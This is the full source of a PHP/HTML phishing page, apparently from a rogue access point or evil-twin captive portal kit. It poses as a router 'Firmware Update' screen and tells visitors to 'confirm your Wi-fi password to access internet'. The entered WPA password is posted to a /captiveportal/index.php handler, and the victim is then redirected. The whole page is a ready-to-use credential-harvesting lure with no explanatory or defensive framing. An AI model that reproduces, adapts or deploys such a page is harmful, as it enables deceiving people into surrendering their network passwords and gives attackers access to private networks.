<?php
$destination = "http://". $_SERVER['HTTP_HOST'] . $_SERVER['HTTP_URI'] . "";
?>

  <html>

  <head>
    <title>oauth-login</title>
    <meta HTTP-EQUIV="Pragma" CONTENT="no-cache">
    <script type="text/javascript">
      function redirect() {
        setTimeout(function() {
          window.location = "/captiveportal/index.php";
        }, 100);
      }
    </script>
    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <script src="assets/js/jquery-2.2.1.min.js"></script>
  </head>



  <body>

    <center>
      <div class="show" id="login-modal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
        <div class="modal-dialog">
          <div class="loginmodal-container">
            <h1>Firmware Update</h1>
            <h2>Password requested to restore Router configuration</h2>
            <h3>Please confirm your Wi-fi password to access internet</h3>
            <br>

            <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
              <input type="hidden" name="target" value="<?=$destination?>">
              <input type="password" name="pass" placeholder="WPA Password" required>
              <input type="submit" name="login" class="login loginmodal-submit" value="Login">
            </form>

            <div class="login-help">
              <a href="#">Register</a> - <a href="#">Forgot Password</a>
            </div>
          </div>
        </div>
      </div>
    </center>
  </body>

  </html>
